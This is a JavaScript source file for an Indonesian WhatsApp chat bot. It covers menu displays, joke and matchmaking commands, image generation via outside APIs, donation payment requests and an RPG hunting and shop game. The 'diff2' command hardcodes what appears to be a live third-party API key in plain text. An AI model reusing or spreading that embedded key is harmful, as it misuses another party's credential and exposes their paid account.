├─ ❖ *Nama*: ${pushname}
├─ ❖ *Status User*: ${isPrem ? 'premium' : 'free user'}
├─ ❖ *Mode*: _${conn.public ? 'Publik' : 'Self'}_
├─ ❖ *Pengguna*: ${Object.keys(global.db.data.users).length}
│
├─ 🌐 *SOSIAL MEDIA* ─┤
│
├─ ❖ *WhatsApp*: ${global.ownername}
├─ ❖ *YouTube*: DichCreator 
├─ ❖ *Tiktok*: @dichnembie
│
├─ 🤖 *INFO BOT* ─┐
│
├─ ❖ *Nama Bot*: ${global.botname}
├─ ❖ *Total Fitur*: ${totalfitur()}
├─ ❖ *Pengembang*: ${global.ownername}
└─ ❖ *Versi*: 7.0.0
│
└─ ✨ Terima kasih telah menggunakan *${global.botname}*! 🌟`
                      
        
        conn.sendMessage(m.chat,
{ text: exe,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 999,
isForwarded: true,
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `${global.botname}`,
"body": `Selamat ${ucapanWaktu} ${pushname} 👋🏻`,
"previewType": "VIDEO",
"thumbnailUrl": 'https://telegra.ph/file/a8a4a01557c4aecb32f49.jpg',
"sourceUrl": saluran,
mediaType: 1,
renderLargerThumbnail: true }}},
{ quoted: fkontak})
        

        
        /*conn.sendMessage(m.chat, {
video: fs.readFileSync('./database/base/image/add.jpg'),
caption: exe,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: botname,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/0b79173d8edd7a316b5f3.jpg",
sourceUrl: saluran,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})*/
        break
        case 'allmenu': 
        conn.sendMessage(m.chat, {
text: `${allmenu}`,
contextInfo: { mentionedJid: [sender],
externalAdReply: {
showAdAttribution: false,
title: `YT DichCreator`,
body: `${hariini} || ${time}`,
thumbnailUrl: 'https://telegra.ph/file/3d3e951a8054c23c19ba0.jpg',
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted:m})
        break
        
       case "allmenu2":
    //   if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
        
conn.sendMessage(m.chat, {
text: '🚩 *[ Loading ]* _please wait..._',
contextInfo: { mentionedJid: [sender],
externalAdReply: {
showAdAttribution: false,
title: botname,
body: `Date: ${jam}`,
thumbnailUrl: 'https://telegra.ph/file/ee8f34061b79f17d9e442.jpg',
sourceUrl: saluran,
mediaType: 1,
renderLargerThumbnail: false
}}}, {quoted:m})
    
      /* conn.sendMessage(from, { image: { url: 'https://telegra.ph/file/591c115f83414d565951e.jpg' },
caption: `${infoo}\n${allmenu}`}, {quoted: m})
 m.reply(`${reg}`)*/
        conn.sendMessage(m.chat, {
video: fs.readFileSync('./database/base/media/Xero.mp4'),
caption: `${infoo}\n${allmenu}`,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363310531380313@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnail: add,
sourceUrl: saluran,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fkontak
})
        conn.sendMessage(m.chat, { audio: fs.readFileSync('./database/Audio/sepuh.mp3')})
       break
case "menu3":        
        await conn.sendMessage(m.chat, { react: { text: "🕰️",key: m.key,}
})
        await conn.sendMessage(m.chat, { react: { text: "✅",key: m.key,}
})
        conn.sendMessage(m.chat, {
text: `> *Hallo kak ${pushname}*
> *Selamat ${ucapanWaktu}*
> ┈──────────────────────⏣
> ⏤͟͟͞͞ᵡ    *｢ I N F O   B O T ｣*   ᵡ͟͟͞͞⏤
> ┈──────────────────────⏣
> ❐ _*Bot Name*_ : *${global.botname}*
> ≡ _*Botmode*_ : *Public*
> ≡ _*Uptime*_ : *${runtime(process.uptime())}*
> ┈──────────────────────⏣
> ✂︎┈┈┈┈┈┈┈┈┈
> ╭─────✎『 々 _*INFO USER*_ 』
> │ ⌬│ _*Name*_ : ${pushname}
> │ ⌬│ _*Nomor*_ : @${m.sender.split`@`[0]}
> │ ⌬│ _*Premium*_ :  ${isPrem ? '✅' : '❎'}
> │ ⌬│ _*Bio*_ : Nothing
> ╰────────────⏣
> ✂︎┈┈┈┈┈┈┈┈
> ╭─────✎『 々 _*TODAY*_ 』
> │
> │ ≡ _*${ucapanWaktu}*_
> │ ≡ _*Hari*_: *${hariini}*
> │ ≡ _*Jam*_: *${time}*
> │
> ╰───────────⏣
> ✂︎┈┈┈┈┈┈┈┈
> ╭─────✎『 々 _*INDONESIA TIME*_ 』
> │
> │ ≡ _*WIB*_: *${time}*
> │ ≡ _WIT_: _NOT FOUND_
> │ ≡ _WITA_: _NOT FOUND_
> │
> ╰───────────⏣

> ${botname}
> *Silahkan ketik .AllMENU untuk melihat semua menu*
> 𝙹𝚊𝚗𝚐𝚊𝚗 𝚜𝚙𝚊𝚖 𝚢𝚊 𝚔𝚊𝚔🐧

> © Copyright By DichCreator💤`,
contextInfo: { mentionedJid: [sender],
externalAdReply: {
showAdAttribution: false,
title: '𝙔𝙩 𝘿𝙞𝙘𝙝𝘾𝙧𝙚𝙖𝙩𝙤𝙧💤',
body: botname,
thumbnailUrl: 'https://telegra.ph/file/0406a878469847c282ff7.jpg',
sourceUrl: "",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted:m})
break
/*case "assalamualaikum":
case "assalamu'alaikum":
m.reply(`*[ wa'alaikumsalam kak🤗 ]*, 
_ada yang bisa saya bantu?_`)
            break*/
case 'cekkhodam': {
    if (global.db.data.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1
if (!text) return m.reply("ketik nama lu")
  
	const khodam = pickRandom([
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong",
	])
  
	const response = `
  ╭━━━━°「 *Cekkodam* 」°
┃
┊• *Nama :* ${text}
┃• *Khodam :* ${khodam}
╰═┅═━––––––๑
	  `
  
	m.reply(response)
  }
        reply('_1 Limit Terpakai ✔️_')
break
case 'script': 
      case 'sc':
       if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')  
 conn.relayMessage(m.chat, {
                "requestPaymentMessage": {
                    amount: {
                        value: 2022000,
                        offset: 0,
                        currencyCode: 'IDR'
                    },
                    amount1000: 1000000000000000,
                    background: null,
                    currencyCodeIso4217: 'USD',
                    expiryTimestamp: 0,
                    noteMessage: {
                        extendedTextMessage: {
                            text: 
                            
                            `
Hay Kak ${pushname} 👋
Selamat ${ucapanWaktu}


 _Unduh Script Ini Melalui Tautan Dibawah Ini_
 *_${global.saluran}_*
•-------------------------------------------------•`
                        }
                    },
                    requestFrom: m.sender
                }
            }, {})
break
        case 'jodoh': {
            if (!m.isGroup) return m.reply('khusus grup oyy')
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
conn.sendMessage(m.chat,
{ text: `👩‍❤️‍👨 Jodohmu Adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": `https://telegra.ph/file/dcb86bc95530d949c46c2.jpg`,
"thumbnail": ``,
"sourceUrl": ``}}},
{ quoted: m})        
            }
            break
            case 'imgen': {
            if (skizo == "YOUR_APIKEY") return m.reply('Buat dulu apikeynya sendiri di https://skizo.tech/pricing, tenang aja ada yang bayar ada yang gratis juga kok\nlalu masukin ke setting.js')
if (isBan) return errorReply('Lu di ban kocak awokwok');
if (!isCreator && !isPrem) return errorReply('Lu bukan premium');
if (!text) return m.reply('Masukan Promptnya\nExample:\n1girl, with glasses, in beach');

conn.sendMessage(m.chat, { react: { text: `👌`, key: m.key }});

try {
    let imgURL = `https://skizo.tech/api/generatimg?prompt=${encodeURIComponent(text)}&apikey=${skizo}`;
    let imgBuffer = await getBuffer(imgURL);
    
    await conn.sendMessage(m.chat, { image: imgBuffer, caption: 'Done' }, { quoted: m });
    conn.sendMessage(m.chat, { react: { text: `✅`, key: m.key }});
} catch (e) {
    errorReply('Gagal Convert Gambar');
}
}
break
case 'diffusion': case 'diff': {
if (isBan) return errorReply('Lu di ban kocak awokwok');
if (!isCreator && !isPrem) return errorReply('Lu bukan premium');
if (!text) return m.reply(`Masukan Promptnya\nExample:\n.${command} 1girl, with glasses, in beach`);
    
conn.sendMessage(m.chat, {
text: '_🚩 Loading..._',
contextInfo: { mentionedJid: [sender],
externalAdReply: {
showAdAttribution: false,
title: ownername,
body: 'powered by Zizs',
thumbnailUrl: 'https://telegra.ph/file/76a789b58ccda2e58b9e4.jpg',
sourceUrl: "https://telegra.ph/file/76a789b58ccda2e58b9e4.jpg",
mediaType: 1,
renderLargerThumbnail: false
}}}, {quoted:m})

conn.sendMessage(m.chat, { react: { text: `👌`, key: m.key }});
conn.sendMessage(m.chat, message, { quoted: m });

try {
    let imgURL = `https://api.lolhuman.xyz/api/diffusion-prompt?apikey=${apikey}&prompt==${encodeURIComponent(text)}`;
    let imgBuffer = await getBuffer(imgURL);
    
    await conn.sendMessage(m.chat, { image: imgBuffer, caption: 'Done' }, { quoted: m });
    conn.sendMessage(m.chat, { react: { text: `✅`, key: m.key }});
} catch (e) {
    errorReply('Gagal Convert Gambar');
}
}
            break
        case 'txt2img':{
        if (skizo == "YOUR_APIKEY") return m.reply('Buat dulu apikeynya sendiri di https://skizo.tech/pricing, tenang aja ada yang bayar ada yang gratis juga kok\nlalu masukin ke setting.js')
if (isBan) return errorReply('Lu di ban kocak awokwok') 
if (!isCreator&&!isPrem) return errorReply('Lu bukan premium')
if (!text) return m.reply('Masukan Promptnya\nExample:\n1girl, with glasses, in beach')
conn.sendMessage(m.chat, { react: { text: `👌`, key: m.key }})
try {
let txt = await getBuffer(`https://skizo.tech/api/txt2img?text=${text}&apikey=${skizo}`)
    await conn.sendMessage(m.chat, {image: txt, caption: `Done`},{quoted: m})
conn.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
     } catch (e) {
errorReply('Gagal Convert Gambar') 
}
}
break
case 'diff2': case 'diffusion2': {
if (!text) return m.reply('promtpnya?')
let myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");

let raw = JSON.stringify({
  "key": "TouFyL4VyhWWNhqC3DnF5hAdR2fLXxgGY4Gpe4BqC8YGKE2j4NjuNrJAXetE",
  "prompt": text,
  "negative_prompt": "ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers",
  "width": "720",
  "height": "720",
  "samples": "1",
  "num_inference_steps": "20",
  "seed": null,
  "guidance_scale": 7.5,
  "safety_checker": "yes",
  "multi_lingual": "no",
  "panorama": "no",
  "self_attention": "no",
  "upscale": "no",
  "embeddings_model": null,
  "webhook": null,
  "track_id": null
});

var requestOptions = {
  method: 'POST',
  headers: myHeaders,
  body: raw,
  redirect: 'follow'
};
fetch("https://stablediffusionapi.com/api/v3/text2img", requestOptions)
  .then(response => response.json())
  .then(result => 
    conn.sendMessage(m.chat, {image: { url: result.output[0]}, caption: result.meta.prompt}, { quoted: m})).catch(error => {
  console.log('error', error);
  conn.sendMessage(m.chat, {image: { url: `${error.config.url}`}, caption: text}, { quoted: m})
})
    }
break

//=================================================//        
case 'ownermenu': {
      if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
     // if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
conn.sendMessage(from, { image: { url: 'https://telegra.ph/file/c996f866a6c95a8bbeab9.jpg' }, 
caption: `${infoo}\n${ownermenu}`}, {quoted: m})
}
break
case "tqto2": 
 const owned = `${owner}@s.whatsapp.net`
const version = 2
const text12 = `Thanks To
- All people in the world
- All people in the galaxy
- My Parent
- My Friends`
conn.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: false,
title: ownername,
body: '',
thumbnailUrl: 'https://telegra.ph/file/a5e79f81593e3cdb4740b.jpg',
sourceUrl: "https://telegra.ph/file/a5e79f81593e3cdb4740b.jpg",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted:m})

break
case "sosmed": 
 let kizhs = `*Hi ${pushname}👋*

𝗦𝗼𝗰𝗶𝗮𝗹 𝗠𝗲𝗱𝗶𝗮
𝙸𝙶 : △https://www.instagram.com/
𝚈𝚃 : △https://youtube.com/
𝙶𝙷 : △https://github.com/
𝚆𝙴𝙱𝚂𝙸𝚃𝙴 : △https://exampleee.com
𝙶𝙲 : △https://chat.whatsapp.com/
𝙸𝙽𝙵𝙾 𝚄𝙿𝙳𝙰𝚃𝙴 𝙱𝙾𝚃 : △https://whatsapp.com/channel/

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬
`
 reply(kizhs)
break

case 'donasi': 
      case 'donate': 
              
 conn.relayMessage(m.chat, {
                "requestPaymentMessage": {
                    amount: {
                        value: 2022000,
                        offset: 0,
                        currencyCode: 'IDR'
                    },
                    amount1000: 1000000000000000,
                    background: null,
                    currencyCodeIso4217: 'USD',
                    expiryTimestamp: 0,
                    noteMessage: {
                        extendedTextMessage: {
                            text: 
                            
                            `
⊱━━━ PAYMENT DONASI ━━━⊰

        𝗗𝗮𝗻𝗮   : ${dana}
        𝗚𝗼𝗽𝗮𝘆  : ${gopay}
        𝗣𝘂𝗹𝘀𝗮   : ${pulsa}
        
  Terima Kasih Pada Yang Sudah Berdonasi😗
        
  ┗━━━━ ${global.botname} ━━━┛
  `
                        }
                    },
                    requestFrom: m.sender
                }
            }, {})
break

case 'bugmenu': {
      if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
     // if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
conn.sendMessage(from, { image: { url: 'https://telegra.ph/file/9722cfcc3ef14eaac6a54.jpg' }, 
caption: `${infoo}\n${bugmenu}`}, {quoted: m})
}
break

//=================================================//
case 'groupmenu': {
      if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
     // if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
let title = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
conn.sendMessage(from, { image: { url: 'https://telegra.ph/file/01fb596f64b95701f2f8d.jpg' },
caption: `${infoo}\n${groupmenu}`}, {quoted: m})
}
break
//=================================================//
case 'tools': case 'tool': {
  if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
     // if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
let title = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
conn.sendMessage(from, { image: { url: 'https://telegra.ph/file/c86ed8065bf983f8cc701.jpg' }, 
caption: `${infoo}\n${tools}`}, {quoted: m})
}
break
//=================================================//
 case 'randommenu': {
       if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
     // if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
let title = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
conn.sendMessage(from, { image: { url: 'https://telegra.ph/file/aa07b5aa358afc6af3a1b.jpg' }, 
caption: `${infoo}\n${randommenu}`}, {quoted: m})
}
break
//=================================================//
case 'islammenu': {
      if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
     // if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
let title = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
conn.sendMessage(from, { image: { url: 'https://telegra.ph/file/80796cdff04112d5cc658.jpg' }, 
caption: `${infoo}\n${islammenu}`}, {quoted: m})
}
break
//=================================================//
case 'gasmenu': {
//if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
    
reply(`
 🌟 𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : ${global.botname}
🌟 𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : ${ownername}
🌟 𝙿𝚛𝚎𝚖𝚒𝚞𝚖 : ${isPrem ? '✅' : '❎'}
🌟 tanggal: ${hariini}
🌟 𝙹𝚊𝚖: ${time} WIB
${gasmenu}`)
}
break
//=================================================//
case 'textmaker':{
if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
     // if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
let title = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
conn.sendMessage(from, { image: { url: 'https://telegra.ph/file/3159db6a74302b39aacf6.jpg' }, 
caption: `${infoo}\n${textmaker}`}, {quoted: m})
}
break
//=================================================//
case 'infomenu':
//if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
   if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
let footgkzoo = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `${infoo}\n${infomenu}
`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": footgkzoo, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": smenu,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================//
       case 'addmenu': {
     if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
     // if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
let title = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
conn.sendMessage(from, { image: { url: 'https://telegra.ph/file/84bbb67b2673f9cb80d52.jpg' }, 
caption: `${infoo}\n${addmenu}`}, {quoted: m})
}
break
//=================================================//
case 'beritamenu': {
      if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
     // if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
let title = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
conn.sendMessage(from, { image: { url: 'https://telegra.ph/file/c7c158f0645c806682955.jpg' }, 
caption: `${infoo}\n${beritamenu}`}, {quoted: m})
}
break
//=================================================//
        case 'rpg': case 'rpgmenu': {
      if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
     // if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
let title = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
conn.sendMessage(from, { image: { url: 'https://telegra.ph/file/abbdf896056030580053d.jpg' }, 
caption: `${infoo}\n${rpgmenu}`}, {quoted: m})
}
                    break
        //=========================================//
case 'funmenu':
//if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
     if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
conn.sendMessage(from, { image: { url: 'https://telegra.ph/file/cc5ea35cf6da465522dbd.jpg' }, 
caption: `${infoo}\n${funmenu}`}, {quoted: m})
break
//=================================================
case 'gamemenu':{
      if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
     // if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
let title = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
conn.sendMessage(from, { image: { url: 'https://telegra.ph/file/d74eab7f3a561616b2213.jpg' }, 
caption: `${infoo}\n${gamemenu}`}, {quoted: m})
}
break
case 'aimenu': {
      if (isBan) return m.reply('*Anda Telah Diban Jadi Nggak Bisa Memakai Fitur Bot Lagi*')
     // if (!isRegistered) return replyMsg('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
  
conn.sendMessage(m.chat, {
text: '_Sabarr Yaa Kakk!._',
contextInfo: { mentionedJid: [sender],
externalAdReply: {
showAdAttribution: false,
title: ownername,
body: 'powered by Zizs',
thumbnailUrl: 'https://telegra.ph/file/76a789b58ccda2e58b9e4.jpg',
sourceUrl: "https://telegra.ph/file/76a789b58ccda2e58b9e4.jpg",
mediaType: 1,
renderLargerThumbnail: false
}}}, {quoted:m})
    
conn.sendMessage(from, { image: { url: 'https://telegra.ph/file/0e81e3e4a52bd2de505e7.jpg' }, 
caption: `${infoo}\n${aimenu}`}, {quoted: m})
conn.sendMessage(m.chat, message, { quoted: m });
}
break
        
        
//RPG
//[ Rpg Menu ]\\

 //cr thunder
case 'inventori': case 'inventory': case 'profile':{
if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
if (!isInventory){ addInventori(m.sender) }
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }

let teksehmazeh = `_[ INFO USER ]_\n\n`
teksehmazeh += `*🌡️Darah kamu:* ${getDarah(m.sender)}\n`
teksehmazeh += `*⛓️Besi kamu:* ${getBesi(m.sender)}\n`
teksehmazeh += `*🎗️Emas Kamu:* ${getEmas(m.sender)}\n`
teksehmazeh += `*🔰Emerald Kamu:* ${getEmerald(m.sender)}\n`
teksehmazeh += `*🌟Limit kamu:* ${getLimit(m.sender)}\n`
teksehmazeh += `*🧪Potion Kamu:* ${getPotion(m.sender)}\n\n`
teksehmazeh += `_[ HASIL BURUAN ]_\n\n`
teksehmazeh += `*🐟Ikan:* ${getIkan(sender)}\n`
teksehmazeh += `*🐔Ayam:* ${getAyam(sender)}\n`
teksehmazeh += `*🐇Kelinci:* ${getKelinci(m.sender)}\n`
teksehmazeh += `*🐑Domba:* ${getDomba(sender)}\n`
teksehmazeh += `*🐄Sapi:* ${getSapi(sender)}\n`
teksehmazeh += `*🐘Gajah:* ${getGajah(sender)}\n\n`
reply(teksehmazeh)
}
break
        case 'hunt': case 'hunting': case 'berburu':{
 if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
 if (isCekDarah < 1) return reply('Your Blood Is Gone, Try To Heal Using Potions') 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
let luka = ["Tertusuk Duri Saat Berburu","Terpleset Ke Jurang Saat Berburu","Tertangkap Hewan Buas","Tidak Berhati-hati","Terjerat Akar","Terjatuh Saat berburu"]
let location = ["Hutan","Hutan Amazon","Hutan Tropis","Padang Rumput","Hutan Afrika","Pegunungan"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)] 
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
 if (lokasinya === 'Hutan') {
 var image = './database/base/image/rimba.jpg'
} else
 if (lokasinya === 'Hutan Amazon') {
 var image ='./database/base/image/amazon.jpg'
} else
 if (lokasinya === 'Hutan Tropis') {
 var image = './database/base/image/tropis.jpg'
} else
 if (lokasinya === 'Padang Rumput') {
 var image = './database/base/image/padang_rumput.jpg'
} else
 if (lokasinya === 'Hutan Afrika') {
 var image = './database/base/image/afrika.jpg'
} else
 if (lokasinya === 'Pegunungan') {
var image = './database/base/image/pegunungan.jpg'
}
 setTimeout( () => {
let teksehmazeh = `_[ Hasil Berburu ]_\n`
teksehmazeh += `*🐟Ikan* : ${ikanmu}\n`
teksehmazeh += `*🐔Ayam* : ${ayam}\n`
teksehmazeh += `*🐇Kelinci* : ${kelinci}\n`
teksehmazeh += `*🐑Domba* : ${domba}\n`
teksehmazeh += `*🐄Sapi* : ${sapi}\n`
teksehmazeh += `*🐘Gajah* : ${gajah}\n\n`
teksehmazeh += `_[ INFO ]_\n`
teksehmazeh += `*Lokasi* : ${lokasinya}\n`
teksehmazeh += `*Luka* : ${lukanya}, Darah - 10\n`
teksehmazeh += `*Sisa Darah* : ${getDarah(m.sender)}\n`
conn.sendMessage(m.chat, { image: { url: image }, caption: teksehmazeh }, { quoted: m })
}, 5000)
setTimeout( () => {
reply(`${pushname} Mulai Berburu Di ${lokasinya}`)
}, 1000) 
 addIkan(m.sender, ikanmu) 
addAyam(m.sender, ayam) 
addKelinci(m.sender, kelinci)
addDomba(m.sender, domba)
addSapi(m.sender, sapi)
addGajah(m.sender, gajah)
 kurangDarah(m.sender, 10)
 }
 break
        //transaksi
 case 'beli': case 'buy':{
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m.sender) }
 if (!isInventory){ addInventori(m.sender) }
 if (!q) return reply(`Apa yg ingin kamu beli?\n\n1.potion\n2.baitfood\n\nContoh: ${prefix + command} baitfood`)
 var anu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addPotion(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Potion Mu:* ${getPotion(m.sender)}`)
}, 2000) 
 } else 
 if (args[0] === 'baitfood'){
let noh = 5000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Bait Food Mu:* ${getUmpan(m.sender)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
let noh = 35000 * anu
 if (!args[1]) return reply(`Contoh : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addLimit(m.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m.sender)}\n*Your Limit* : ${getLimit(m.sender)}`)
}, 2000) 
} else { reply("Incorrect Format!") }
 }
 break
        //========================================================================//
case 'leaderboard':
{ 
let txt = ` *LEADERBOARD* \n\n`
for (let i of _buruan){
txt += `*🐾ID :* ${i.id}\n`
txt += `*🐟Ikan* : ${i.ikan}\n`
txt += `*🐔Ayam* : ${i.ayam}\n`
